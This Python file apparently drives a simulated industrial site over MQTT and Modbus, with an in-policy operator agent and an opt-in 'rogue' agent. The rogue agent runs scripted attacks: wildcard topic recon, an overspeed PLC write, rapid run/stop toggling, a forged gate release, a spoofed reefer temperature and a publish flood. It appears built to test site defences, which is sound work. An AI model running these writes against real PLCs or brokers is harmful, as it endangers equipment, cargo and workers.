"""Sim agents.

OperatorAgent (default): subscribes to its sensor/gate topics (no wildcard)
and issues in-policy PLC writes plus gate releases:
    - temp > 80C  -> lower speed setpoint 200 RPM (floor 0)
    - temp < 70C  -> raise speed setpoint 100 RPM (policy ceiling 1500)
    - vibration > 5 mm/s -> STOP the line (HR0 = 0)
    - truck_arrival gate event with matching container + truck + booking
      -> publish a release to site/yard/gate/release

RogueAgent (--rogue): scripted attack sequence, OFF by default:
    0. wildcard recon: subscribe to # and capture a traffic sample
    1. set speed setpoint to 3000 RPM (above policy ceiling)
    2. toggle RUN/STOP 5 times fast
    3. publish an unauthorized gate release for a container that never arrived
    4. publish a spoofed reefer temperature (implausible jump off setpoint)
    5. publish flood: burst of rapid publishes to trigger the rate cap
"""

import argparse
import json
import time

import paho.mqtt.client as mqtt
from pymodbus.client import ModbusTcpClient

HR_RUN_STOP = 0
HR_SPEED_SETPOINT = 1

TOPIC_TEMPERATURE = "site/line1/sensors/temperature"
TOPIC_VIBRATION = "site/line1/sensors/vibration"
TOPIC_GATE_EVENT = "site/yard/gate/event"
TOPIC_GATE_RELEASE = "site/yard/gate/release"

# Explicit subscribes only: starter rule 4 forbids wildcard subscribes
# for non-gateway agents. Must match the publishers' topics
# (pinned by tests/test_sim_contract.py).
OPERATOR_TOPICS = (TOPIC_TEMPERATURE, TOPIC_VIBRATION, TOPIC_GATE_EVENT)

# Booking registry stand-in (a real deployment queries the terminal
# operating system). Keys must match BOOKED_ARRIVALS in sim/yard.py.
BOOKINGS = {
    "MSKU100001": {"truck": "TRK-42", "booking": "BK-1001"},
    "TCLU200002": {"truck": "TRK-17", "booking": "BK-2002"},
}

SPEED_POLICY_MAX = 1500  # in-policy ceiling; PLC hardware max is 3000
TEMP_HIGH = 80.0
TEMP_LOW = 70.0
VIBRATION_TRIP = 5.0


class OperatorAgent:
    def __init__(self, mqtt_host, mqtt_port, plc_host, plc_port):
        self.mqtt = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2)
        self.mqtt.on_message = self.on_message
        self.mqtt_host, self.mqtt_port = mqtt_host, mqtt_port
        self.plc = ModbusTcpClient(plc_host, port=plc_port)
        self.speed = 1000  # last commanded setpoint (assumed start)
        self.running = True

    def plc_write(self, address, value):
        self.plc.write_register(address, value, device_id=1)
        print(f"operator: PLC write HR{address}={value}", flush=True)

    def start_line(self):
        if not self.running:
            self.plc_write(HR_RUN_STOP, 1)
            self.running = True

    def on_message(self, _client, _userdata, msg):
        try:
            data = json.loads(msg.payload.decode())
        except ValueError:
            return
        topic = msg.topic

        if topic == TOPIC_TEMPERATURE:
            temp = data.get("value")
            print(f"operator: temp={temp}C", flush=True)
            if temp is None:
                return
            if temp > TEMP_HIGH:
                self.set_speed(self.speed - 200)
            elif temp < TEMP_LOW:
                self.set_speed(self.speed + 100)
        elif topic == TOPIC_VIBRATION:
            vib = data.get("value")
            if vib is not None and vib > VIBRATION_TRIP and self.running:
                print(f"operator: vibration {vib} over trip -> STOP", flush=True)
                self.plc_write(HR_RUN_STOP, 0)
                self.running = False
        elif topic == TOPIC_GATE_EVENT:
            if data.get("event") == "truck_arrival":
                self.maybe_release(data)

    def maybe_release(self, event):
        """Release only on matching container + truck + booking."""
        container, truck = event.get("container"), event.get("truck")
        booking = BOOKINGS.get(container)
        if booking is None or booking["truck"] != truck:
            print(f"operator: no matching booking for container={container} "
                  f"truck={truck} -> no release", flush=True)
            return
        release = {"container": container, "truck": truck,
                   "booking": booking["booking"], "lane": event.get("lane"),
                   "decision": "allow", "ts": time.time()}
        self.mqtt.publish(TOPIC_GATE_RELEASE, json.dumps(release))
        print(f"operator: gate release {release}", flush=True)

    def set_speed(self, rpm):
        rpm = max(0, min(SPEED_POLICY_MAX, int(rpm)))
        if rpm != self.speed:
            self.start_line()
            self.plc_write(HR_SPEED_SETPOINT, rpm)
            self.speed = rpm

    def run(self):
        self.plc.connect()
        self.plc_write(HR_RUN_STOP, 1)  # ensure line running
        self.plc_write(HR_SPEED_SETPOINT, self.speed)
        self.mqtt.connect(self.mqtt_host, self.mqtt_port)
        for topic in OPERATOR_TOPICS:
            self.mqtt.subscribe(topic)
        print(f"operator: subscribed to {', '.join(OPERATOR_TOPICS)}", flush=True)
        try:
            self.mqtt.loop_forever()
        except KeyboardInterrupt:
            pass
        finally:
            self.mqtt.disconnect()
            self.plc.close()


class RogueAgent:
    """Scripted attack sequence. Only runs when explicitly enabled."""

    def __init__(self, mqtt_host, mqtt_port, plc_host, plc_port):
        self.mqtt = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2)
        self.mqtt_host, self.mqtt_port = mqtt_host, mqtt_port
        self.plc = ModbusTcpClient(plc_host, port=plc_port)

    def run(self):
        self.plc.connect()
        self.mqtt.connect(self.mqtt_host, self.mqtt_port)
        self.mqtt.loop_start()
        print("ROGUE: starting scripted attack sequence", flush=True)
        try:
            self._recon()
            print("ROGUE[1]: overspeed -> HR1=3000", flush=True)
            self.plc.write_register(HR_SPEED_SETPOINT, 3000, device_id=1)
            time.sleep(1)
            for i in range(5):
                print(f"ROGUE[2]: run/stop toggle {i + 1}/5", flush=True)
                self.plc.write_register(HR_RUN_STOP, i % 2, device_id=1)
                time.sleep(0.5)
            print("ROGUE[3]: unauthorized gate release", flush=True)
            self.mqtt.publish(TOPIC_GATE_RELEASE, json.dumps(
                {"container": "XXXX000000", "truck": "TRK-99",
                 "booking": "BK-FAKE", "lane": "out-1",
                 "decision": "allow", "ts": time.time()}))
            time.sleep(1)
            print("ROGUE[4]: spoofed reefer temp (R-101 reports +5C, setpoint -20C)",
                  flush=True)
            self.mqtt.publish("site/yard/reefer/R-101/temperature", json.dumps(
                {"value": 5.0, "unit": "C", "setpoint": -20.0,
                 "ts": time.time()}))
            time.sleep(1)
            print("ROGUE[5]: publish flood (50 rapid publishes)", flush=True)
            for i in range(50):
                self.mqtt.publish(TOPIC_TEMPERATURE, json.dumps(
                    {"value": 72.0, "unit": "C", "ts": time.time(),
                     "flood_seq": i}))
            time.sleep(1)
        finally:
            self.mqtt.loop_stop()
            self.mqtt.disconnect()
            self.plc.close()
        print("ROGUE: attack sequence complete", flush=True)

    def _recon(self):
        """Wildcard recon: subscribe to # and capture a traffic sample."""
        seen = []
        self.mqtt.on_message = lambda _c, _u, m: seen.append(m.topic)
        self.mqtt.subscribe("#")
        print("ROGUE[0]: wildcard recon on # ...", flush=True)
        time.sleep(3)
        self.mqtt.unsubscribe("#")
        self.mqtt.on_message = None
        print(f"ROGUE[0]: captured {len(seen)} messages via # "
              f"(e.g. {sorted(set(seen))[:5]})", flush=True)


def main() -> None:
    parser = argparse.ArgumentParser(description="Sim agents.")
    parser.add_argument("--mqtt-host", default="127.0.0.1")
    parser.add_argument("--mqtt-port", type=int, default=1883)
    parser.add_argument("--plc-host", default="127.0.0.1")
    parser.add_argument("--plc-port", type=int, default=5020)
    parser.add_argument("--rogue", action="store_true",
                        help="run the RogueAgent attack sequence (off by default)")
    args = parser.parse_args()

    if args.rogue:
        RogueAgent(args.mqtt_host, args.mqtt_port,
                   args.plc_host, args.plc_port).run()
    else:
        OperatorAgent(args.mqtt_host, args.mqtt_port,
                      args.plc_host, args.plc_port).run()


if __name__ == "__main__":
    main()
